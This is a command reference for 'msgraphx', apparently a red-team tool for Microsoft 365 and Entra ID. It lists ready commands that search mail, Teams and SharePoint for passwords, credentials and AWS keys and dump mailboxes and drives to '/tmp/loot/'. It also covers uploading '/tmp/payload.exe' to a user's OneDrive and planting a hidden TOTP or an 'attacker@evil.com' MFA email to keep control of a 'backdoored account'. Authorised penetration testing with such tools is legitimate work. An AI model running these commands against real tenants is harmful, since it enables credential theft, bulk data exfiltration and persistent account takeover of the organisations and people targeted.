# msgraphX: Command Reference

Full reference for all `msgraphx` subcommands and flags. For installation and authentication setup see [README.md](README.md).

## Global flags

These flags are available to every subcommand.

| Flag | Description |
|------|-------------|
| `--after <date>` | Only items created after this date. Format: `YYYY-MM-DD` or relative (`5h`, `3d`, `1w`, `2y`). Defaults to `1y` for search modules. |
| `--before <date>` | Only items created before this date. Same formats. |
| `--all` | Remove the default time bound. Overrides `--after`. |
| `--json` | Output results as JSON to stdout. Suppresses console rendering; logs still go to stderr. |
| `--ndjson` | Stream results as NDJSON (one JSON object per line). Useful for piping to `jq` or LLM tools. |
| `--save PATH` / `-o PATH` | Directory to save downloaded files. Created if it does not exist. |
| `--proxy [URL]` | Route traffic through a proxy. Defaults to `http://127.0.0.1:8080` (Burp Suite) if no URL is given. |
| `--region REGION` | Search region for app-only tokens: `NAM`, `EMEA` (default), `APC`. |
| `--drive-id ID` | Scope SharePoint operations to a specific drive. Also reads from `DRIVE_ID` env var. |
| `--debug` | Enable DEBUG logging. |
| `--trace` | Enable TRACE logging. |
| `--log-level LEVEL` | Set log level explicitly: `TRACE`, `DEBUG`, `INFO`, `WARNING`, `ERROR`, `CRITICAL`. |

---

## refresh

Background token refresh daemon. Keeps a delegated session alive for long-running operations. Runs before the Graph auth flow, so no token is required to manage the daemon.

```bash
# start the daemon (watches .roadtools_auth in the current directory)
msgraphx refresh --daemon

# watch a specific token file
msgraphx refresh --daemon --token-file /tmp/tokens.json

# check status (shows last refresh time, token expiry, next refresh ETA)
msgraphx refresh --status

# check status as JSON
msgraphx refresh --status --json

# stop
msgraphx refresh --stop
```

PID file: `~/.local/state/msgraphx/refresh.pid`  
State file: `~/.local/state/msgraphx/refresh.state.json`

---

## outlook / mail

Requires delegated auth.

### contacts

Build a communication graph from your mailbox ranked by interaction frequency.

```bash
msgraphx outlook contacts
msgraphx mail contacts --only sent
msgraphx mail contacts --only received
msgraphx mail contacts --after 90d --top 50
msgraphx mail contacts --all --save /tmp/contacts.json
```

Flags: `--only sent|received`, `--top N`.

### search

KQL mailbox search. Streams up to 1 000 results (Exchange API cap). Results cached to `~/.local/share/msgraphx/last_mail.json`.

```bash
msgraphx outlook search "password"
msgraphx outlook search --from alice@corp.com
msgraphx outlook search --subject "VPN" --has-attachments
msgraphx outlook search "credentials" --after 90d
```

Flags: `--from ADDR`, `--subject TEXT`, `--has-attachments`.

### download

Download emails from the last search as `.eml` files.

```bash
msgraphx outlook download 1
msgraphx outlook download 1,3
msgraphx outlook download 1-5 --save /tmp/loot/
```

---

## sharepoint / sp

### search

Full-text search across SharePoint. Results cached to `~/.local/share/msgraphx/<identity>/last_sharepoint.json`.

```bash
msgraphx sp search "password"
msgraphx sp search --filetype pdf
msgraphx sp search -f docx "confidential"
msgraphx sp search --hunt credentials
msgraphx sp search --hunt ssh --all
msgraphx sp search "budget" --my-groups
msgraphx sp search --hunt credentials --save /tmp/loot/

# scope to a specific site (name, full URL, or Graph site ID)
msgraphx sp search "password" --site EngieITCybersecurity
msgraphx sp search "password" --site "https://tenant.sharepoint.com/sites/MySite"
```

Flags: `--filetype EXT` / `-f EXT`, `--hunt QUERY`, `--my-groups`, `--site SITE`.

`--site` accepts a site name/slug (resolved via `$search`), a full SharePoint URL, or a Graph site ID. When multiple sites match a name, the first match is used with a warning.

Predefined hunt queries: `credentials`, `ssh`, `office`, and others (run `--hunt` without a value to list them).

### sites

Enumerate SharePoint sites accessible to the current user.

```bash
# full tenant-wide search (uses POST /search/query with EntityType.Site)
msgraphx sp sites

# fetch only sites from your M365 group membership (faster, 1 call per group)
msgraphx sp sites --from-groups

# enrich tenant-wide results with group membership info
msgraphx sp sites --enrich
```

`--from-groups` and `--enrich` are mutually exclusive. `--enrich` reuses the `sites` cache if already populated.

### download

Download files from the last search by index, or dump an entire drive.

```bash
msgraphx sp download 1
msgraphx sp download 1,3
msgraphx sp download 1-3 --save /tmp/loot/

# full drive dump
msgraphx --drive-id <id> sp download --save /tmp/loot/

# force re-download (default is resume)
msgraphx --drive-id <id> sp download --no-resume --save /tmp/loot/
```

---

## groups

Enumerate and interact with Microsoft 365 Unified groups — the cross-service backbone behind Teams workspaces, SharePoint team sites, and Exchange mailboxes.

### list / ls

```bash
# groups you belong to (transitive membership)
msgraphx groups list --mine

# filter to Teams-provisioned groups only
msgraphx groups list --mine --teams-only

# filter by visibility
msgraphx groups list --mine --visibility Private

# all groups in the tenant
msgraphx groups list
msgraphx groups list --visibility Public
```

Flags: `--mine`, `--teams-only`, `--visibility Private|Public`.

### members

```bash
# direct members
msgraphx groups members <group-id>

# transitive members (resolves nested groups)
msgraphx groups members <group-id> --transitive

# users only
msgraphx groups members <group-id> --users-only
```

### sites

Resolve the SharePoint site owned by a group.

```bash
msgraphx groups sites <group-id>
```

---

## teams / ms-teams

Requires delegated auth. Uses `POST /search/query` (`EntityType.ChatMessage`). Needs `ChannelMessage.Read.All` (admin consent) in addition to `Chat.Read`.

### chat

Search 1:1 DMs and group chats.

```bash
msgraphx teams chat "password"
msgraphx teams chat "budget" --from alice
msgraphx teams chat "aws key" --after 90d
msgraphx teams chat "deploy" --after 2024-01-01 --before 2024-06-01
msgraphx teams chat   # wildcard, return everything
```

Results cached to `~/.local/share/msgraphx/last_teams.json`.

### channel

Search messages across all Teams channels you have access to. KQL is passed directly to the Search API.

```bash
msgraphx teams channel "password"
msgraphx teams channel "from:alice@corp.com"
msgraphx teams channel "incident" --after 30d
msgraphx teams channel "subject:deployment AND azure"
```

### show

Show context around a cached result, or browse a named chat.

```bash
# open cached result by index
msgraphx teams show 3
msgraphx teams show 1-5
msgraphx teams show 2 --context 8

# browse a chat by name or member
msgraphx teams show alice
msgraphx teams show "project phoenix" --last 50
```

### send

Send a message to a user (1:1 chat) or a Teams channel. Requires delegated auth. Permissions: `Chat.ReadWrite`, `ChatMessage.Send`, `ChannelMessage.Send`.

```bash
# 1:1 DM by UPN or object ID
msgraphx teams send --to alice@corp.com "Hey, lunch today?"

# 1:1 DM with HTML body
msgraphx teams send --to alice@corp.com --html "<b>Important:</b> see attached."

# post to a channel
msgraphx teams send --team <team-id> --channel <channel-id> "Announcement text"
```

Flags: `--to USER` (UPN, object ID, or mail address), `--channel CHANNEL_ID` (requires `--team`), `--team TEAM_ID`, `--html`.

`--to` and `--channel` are mutually exclusive.

---

## aad / ad (Entra ID)

### search

Enumerate Entra ID objects.

```bash
msgraphx aad search admin
msgraphx aad search --type users "alice"
msgraphx aad search --type groups "IT"
msgraphx aad search --type all "sql"
msgraphx aad search --hunt admins
msgraphx aad search --hunt domain --type groups
msgraphx aad search "corp" --contains
msgraphx aad search --synced-only --type users
msgraphx aad search --filter "accountEnabled eq true and department eq 'IT'"
msgraphx aad search --hunt admins --save-dir /tmp/loot/
```

Flags: `--type users|groups|devices|applications|service_principals|all`, `--hunt QUERY`, `--contains`, `--synced-only`, `--filter ODATA`, `--save-dir PATH`.

### authmethods / mfa

List authentication methods registered for a user. Requires `UserAuthenticationMethod.Read.All`.

```bash
msgraphx aad authmethods alice@corp.com
msgraphx aad mfa <object-id>
```

### ca / policies

List conditional access policies. Requires `Policy.Read.All`.

```bash
msgraphx aad ca
msgraphx aad ca --state enabled
msgraphx aad ca --state disabled
msgraphx aad ca --state report
```

### roles

List directory role assignments. Requires `RoleManagement.Read.Directory`.

```bash
msgraphx aad roles
msgraphx aad roles --filter "principalId eq '<GUID>'"
```

### grants

List delegated OAuth2 permission grants. Requires `DelegatedPermissionGrant.Read.All`.

```bash
msgraphx aad grants
msgraphx aad grants --admin-only
msgraphx aad grants --filter "clientId eq '<GUID>'"
```

### user

Enriched user profile via `$batch`: properties, owned objects, devices, app role assignments, OAuth2 grants.

```bash
msgraphx aad user alice@corp.com
msgraphx aad user <object-id>
```

### group

Enriched group profile via `$batch`: transitive members, owners, drives, sites, team, app roles.

```bash
msgraphx aad group <group-object-id>
```

### pim

List Privileged Identity Management role assignments via `api.azrbac.mspim.azure.com`.

```bash
msgraphx aad pim
msgraphx aad pim --state active
msgraphx aad pim --state eligible
```

---

## me

All subcommands use `/me` and require delegated auth.

### people

Top contacts by interaction frequency (People API).

```bash
msgraphx me people
msgraphx me people --top 50
msgraphx me people --search "alice"
```

### calendar / cal

List calendar events.

```bash
msgraphx me calendar
msgraphx me cal --top 100
msgraphx me calendar --after 2025-01-01 --before 2025-06-01
```

### onenote / notes

Browse notebooks and dump page content.

```bash
msgraphx me onenote --list
msgraphx me notes --page-id <page-id>
```

### planner / tasks

List Planner tasks assigned to you.

```bash
msgraphx me planner
msgraphx me tasks --top 100
```

### trending

Documents trending around you (Graph Insights API).

```bash
msgraphx me trending
msgraphx me trending --top 50 --type Excel
```

### shared

Documents shared with you (Graph Insights API).

```bash
msgraphx me shared
msgraphx me shared --top 50
```

### used

Documents you recently used (Graph Insights API).

```bash
msgraphx me used
msgraphx me used --top 50
```

### groups

Microsoft 365 groups you belong to.

```bash
msgraphx me groups
msgraphx me groups --visibility Public
```

### drive / onedrive

Browse your personal OneDrive as a tree, or upload a file. Requires `Files.ReadWrite`.

```bash
# full tree from root (default depth: 3)
msgraphx me drive tree

# tree rooted at a specific folder
msgraphx me drive tree --path Desktop
msgraphx me drive tree --path "Documents/Projects"

# limit recursion depth
msgraphx me drive tree --depth 2

# upload a file to the root
msgraphx me drive upload /tmp/payload.exe

# upload to a subfolder (created if absent)
msgraphx me drive upload /tmp/payload.exe --path Desktop
msgraphx me onedrive upload report.pdf --path "Documents/Reports"
```

### drive download

```bash
# full drive dump to current directory
msgraphx me drive download --save /tmp/loot/

# download a specific file
msgraphx me drive download --path "Desktop/report.pdf" --save /tmp/loot/

# download a folder recursively
msgraphx me drive download --path Desktop --save /tmp/loot/

# force re-download (default is resume)
msgraphx me drive download --path Desktop --no-resume --save /tmp/loot/
```

Flags: `--path PATH` (file or folder in OneDrive; omit for full dump), `--no-resume`, `--concurrency N` (default 20).

`me onedrive` is an alias for `me drive`.

---

## mfa

Manipulate MFA security info via `mysignins.microsoft.com`. Requires a **separate token** scoped to resource `19db86c3-b2b9-44cc-b339-36da233a3be2` (the My Sign-Ins portal), not the Graph API token. Pass it with `--mfa-token`.

### available

List registered MFA methods and what can be added.

```bash
msgraphx mfa --mfa-token <token> available
```

### add-otp

Register a hidden TOTP authenticator. Auto-verifies and prints the secret key.

```bash
msgraphx mfa --mfa-token <token> add-otp
```

Store the printed secret in any authenticator app to generate codes for the backdoored account.

### add-phone

Register a phone number as SMS or call-based MFA.

```bash
msgraphx mfa --mfa-token <token> add-phone --number 5551234567
msgraphx mfa --mfa-token <token> add-phone --number 5551234567 --country 44 --type call
```

Flags: `--number DIGITS` (required), `--country CODE` (default: `1`), `--type sms|call` (default: `sms`).

### add-email

Register an email address as MFA.

```bash
msgraphx mfa --mfa-token <token> add-email --email attacker@evil.com
```

### verify

Verify a pending method addition.

```bash
msgraphx mfa --mfa-token <token> verify --type <int> --data <data>
msgraphx mfa --mfa-token <token> verify --type <int> --context <ctx> --data <data>
```

### delete

Delete a registered MFA method.

```bash
msgraphx mfa --mfa-token <token> delete --type <int> --data '<json>'
```

---

## query

Call any Graph API endpoint directly. Useful for prototyping or accessing endpoints not covered by a dedicated module. `query` is also the default subcommand: bare paths are routed to it automatically.

```bash
# implicit (no subcommand name needed)
msgraphx /me
msgraphx /users
msgraphx /me/messages

# explicit
msgraphx query /me/drive/root/children

# OData options
msgraphx query /users --filter "department eq 'IT'" --select id,displayName,mail
msgraphx query /groups --top 999 --paginate

# beta endpoint
msgraphx query /me/drive/root/children --beta

# POST with JSON body
msgraphx query /me/sendMail --method POST --body '{"message": {...}}'

# read body from stdin
cat payload.json | msgraphx query /search/query --method POST --body -
```

Flags: `--method GET|POST|PATCH|PUT|DELETE`, `--filter ODATA`, `--select FIELDS`, `--top N`, `--paginate`, `--beta`, `--body JSON|-`.
